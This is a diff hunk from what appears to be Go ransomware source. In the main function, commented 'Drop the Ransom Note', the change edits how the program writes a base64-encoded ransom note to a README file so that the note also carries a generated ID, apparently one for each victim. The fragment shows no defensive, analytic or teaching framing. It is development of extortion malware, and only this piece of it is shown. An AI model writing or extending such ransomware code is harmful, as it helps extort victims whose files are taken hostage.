@@ -42,7 +42,7 @@ func main() {
 
 	// Drop the Ransom Note
 	f, _ := os.Create(README)
-	f.WriteString(from_b64(NOTE))
+	f.WriteString(from_b64(NOTE) + " " + generate_id())
 	f.Close()
 }
 
